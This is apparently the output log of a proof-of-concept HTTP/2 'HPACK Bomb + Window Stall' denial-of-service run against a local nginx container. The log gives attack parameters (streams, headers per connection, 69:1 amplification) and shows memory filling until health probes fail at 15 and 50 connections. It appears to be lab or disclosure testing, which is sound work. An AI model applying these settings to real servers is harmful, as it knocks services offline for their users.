
========== ATTACK N=1 ==========
RSS before: 5 MiB3 MiB | probe: code=200 time=0.003574s
[20:13:26] RSS=5 MiB3 MiB container=2.004MiB / 8GiB probe=code=200 time=0.002805s
[20:13:32] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002916s
[20:13:38] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002576s
[20:13:44] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002607s
[20:13:50] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002707s
[20:13:56] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002503s
[20:14:02] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002534s
[20:14:08] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002490s
[20:14:15] RSS=286 MiB3 MiB container=283.8MiB / 8GiB probe=code=200 time=0.002531s

======================================================================
  HPACK Bomb + Window Stall PoC
  Target:      127.0.0.1:8443
  Connections: 1
  Streams:     128 per connection
  Headers:     32,000 per stream
  Hold:        20s (drip every 50s)
======================================================================

  Estimated server memory:
    Per stream:     2.1 MB
    Per connection: 270 MB
    Total:          270 MB (0.3 GB)
    Wire upload:    4 MB
    Amplification:  69:1

[*] Phase 1a: Establishing 1 TLS+H2 connections...
    1/1 connections established in 2.0s
[*] Phase 1b: Sending HPACK bombs on all 1 connections...
    Connection 0: sent 3.9 MB

[*] Phase 1 complete: 1 connections, 3.9 MB uploaded in 1.2s
    Upload rate: 3.2 MB/s

[*] Phase 2: Holding server memory for 20s (drip every 50s)...
    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
    Press Ctrl+C to stop early.


[*] Done. Total time: 53s
    Connections still active: 1/1
    Total wire uploaded: 3.9 MB
RSS after: 286 MiB3 MiB | elapsed=55s | probe: code=200 time=0.002486s

========== ATTACK N=5 ==========
RSS before: 2 MiB3 MiB | probe: code=200 time=0.002712s
[20:14:26] RSS=5 MiB3 MiB container=1.887MiB / 8GiB probe=code=200 time=0.002634s
[20:14:32] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002696s
[20:14:38] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002789s
[20:14:44] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002508s
[20:14:50] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002753s
[20:14:57] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002758s
[20:15:03] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002703s
[20:15:09] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002648s
[20:15:15] RSS=1410 MiB3 MiB container=1.377GiB / 8GiB probe=code=200 time=0.002550s

======================================================================
  HPACK Bomb + Window Stall PoC
  Target:      127.0.0.1:8443
  Connections: 5
  Streams:     128 per connection
  Headers:     32,000 per stream
  Hold:        20s (drip every 50s)
======================================================================

  Estimated server memory:
    Per stream:     2.1 MB
    Per connection: 270 MB
    Total:          1348 MB (1.3 GB)
    Wire upload:    20 MB
    Amplification:  69:1

[*] Phase 1a: Establishing 5 TLS+H2 connections...
    5/5 connections established in 2.2s
[*] Phase 1b: Sending HPACK bombs on all 5 connections...
    Connection 1: sent 3.9 MB
    Connection 2: sent 3.9 MB
    Connection 3: sent 3.9 MB
    Connection 0: sent 3.9 MB
    Connection 4: sent 3.9 MB

[*] Phase 1 complete: 5 connections, 19.5 MB uploaded in 2.2s
    Upload rate: 9.0 MB/s

[*] Phase 2: Holding server memory for 20s (drip every 50s)...
    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
    Press Ctrl+C to stop early.


[*] Done. Total time: 54s
    Connections still active: 5/5
    Total wire uploaded: 19.5 MB
RSS after: 1410 MiB3 MiB | elapsed=55s | probe: code=200 time=0.002537s

========== ATTACK N=15 ==========
RSS before: 3 MiB3 MiB | probe: code=200 time=0.002866s
[20:15:26] RSS=5 MiB3 MiB container=2.023MiB / 8GiB probe=code=200 time=0.002832s
[20:15:33] RSS=4026 MiB3 MiB container=4.126GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002369sFAIL
[20:15:47] RSS=4220 MiB3 MiB container=4.126GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002415sFAIL
[20:16:01] RSS=4220 MiB3 MiB container=4.126GiB / 8GiB probe=curl: (28) Connection timed out after 8001 milliseconds
code=000 time=8.001562sFAIL

======================================================================
  HPACK Bomb + Window Stall PoC
  Target:      127.0.0.1:8443
  Connections: 15
  Streams:     128 per connection
  Headers:     32,000 per stream
  Hold:        20s (drip every 50s)
======================================================================

  Estimated server memory:
    Per stream:     2.1 MB
    Per connection: 270 MB
    Total:          4045 MB (3.9 GB)
    Wire upload:    59 MB
    Amplification:  69:1

[*] Phase 1a: Establishing 15 TLS+H2 connections...
    15/15 connections established in 2.7s
[*] Phase 1b: Sending HPACK bombs on all 15 connections...
    Connection 3: sent 3.9 MB
    Connection 2: sent 3.9 MB
    Connection 1: sent 3.9 MB
    Connection 4: sent 3.9 MB
    Connection 9: sent 3.9 MB
    Connection 0: sent 3.9 MB
    Connection 5: sent 3.9 MB
    Connection 6: sent 3.9 MB
    Connection 7: sent 3.9 MB
    Connection 8: sent 3.9 MB
    Connection 10: sent 3.9 MB
    Connection 11: sent 3.9 MB
    Connection 12: sent 3.9 MB
    Connection 13: sent 3.9 MB
    Connection 14: sent 3.9 MB

[*] Phase 1 complete: 15 connections, 58.6 MB uploaded in 4.6s
    Upload rate: 12.9 MB/s

[*] Phase 2: Holding server memory for 20s (drip every 50s)...
    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
    Press Ctrl+C to stop early.


[*] Done. Total time: 57s
    Connections still active: 15/15
    Total wire uploaded: 58.6 MB
[20:16:15] RSS=4220 MiB3 MiB container=4.126GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002692sFAIL
RSS after: 3935 MiB3 MiB | elapsed=63s | probe: code=200 time=0.002756s

========== ATTACK N=50 ==========
RSS before: 2 MiB3 MiB | probe: code=200 time=0.002798s
[20:16:35] RSS=5 MiB3 MiB container=2.145MiB / 8GiB probe=code=200 time=0.002317s
[20:16:41] RSS=1862 MiB3 MiB container=3.009GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002555sFAIL
[20:16:55] RSS=8166 MiB3 MiB container=8GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002501sFAIL

======================================================================
  HPACK Bomb + Window Stall PoC
  Target:      127.0.0.1:8443
  Connections: 50
  Streams:     128 per connection
  Headers:     32,000 per stream
  Hold:        20s (drip every 50s)
======================================================================

  Estimated server memory:
    Per stream:     2.1 MB
    Per connection: 270 MB
    Total:          13482 MB (13.2 GB)
    Wire upload:    195 MB
    Amplification:  69:1

[*] Phase 1a: Establishing 50 TLS+H2 connections...
    50/50 connections established in 4.5s
[*] Phase 1b: Sending HPACK bombs on all 50 connections...
    Connection 6: sent 3.9 MB
    Connection 0: sent 3.9 MB
    Connection 4: sent 3.9 MB
    Connection 35: sent 3.9 MB
    Connection 5: sent 3.9 MB
    Connection 38: sent 3.9 MB
    Connection 40: sent 3.9 MB
    Connection 37: sent 3.9 MB
    Connection 36: sent 3.9 MB
    Connection 39: sent 3.9 MB
    Connection 42: sent 3.9 MB
    Connection 48: sent 3.9 MB
    Connection 45: sent 3.9 MB
    Connection 43: sent 3.9 MB
    Connection 41: sent 3.9 MB
    Connection 44: sent 3.9 MB
    Connection 49: sent 3.9 MB
    Connection 34: sent 3.9 MB
    Connection 47: sent 3.9 MB
    Connection 46: sent 3.9 MB
    Connection 2: sent 3.9 MB
    Connection 1: sent 3.9 MB
    Connection 3: sent 3.9 MB
    Connection 7: sent 3.9 MB
    Connection 8: sent 3.9 MB
    Connection 9: sent 3.9 MB
    Connection 10: sent 3.9 MB
    Connection 11: sent 3.9 MB
    Connection 12: sent 3.9 MB
    Connection 13: sent 3.9 MB
    Connection 14: sent 3.9 MB
    Connection 15: sent 3.9 MB
    Connection 16: sent 3.9 MB
    Connection 17: sent 3.9 MB
    Connection 18: sent 3.9 MB
    Connection 19: sent 3.9 MB
    Connection 20: sent 3.9 MB
    Connection 21: sent 3.9 MB
    Connection 22: sent 3.9 MB
    Connection 23: sent 3.9 MB
    Connection 24: sent 3.9 MB
    Connection 25: sent 3.9 MB
    Connection 26: sent 3.9 MB
    Connection 27: sent 3.9 MB
    Connection 28: sent 3.9 MB
    Connection 29: sent 3.9 MB
    Connection 30: sent 3.9 MB
    Connection 31: sent 3.9 MB
    Connection 32: sent 3.9 MB
    Connection 33: sent 3.9 MB

[*] Phase 1 complete: 50 connections, 195.5 MB uploaded in 2.3s
    Upload rate: 85.4 MB/s

[*] Phase 2: Holding server memory for 20s (drip every 50s)...
    Monitor RSS with: docker exec nginx-h2-poc /usr/bin/python3 /poc/monitor_rss.py
    Press Ctrl+C to stop early.


[*] Done. Total time: 57s
    Connections still active: 50/50
    Total wire uploaded: 195.5 MB
[20:17:10] RSS=8156 MiB3 MiB container=7.998GiB / 8GiB probe=curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002227sFAIL
RSS after: 8156 MiB3 MiB | elapsed=207s | probe: curl: (28) Connection timed out after 8002 milliseconds
code=000 time=8.002818sFAIL
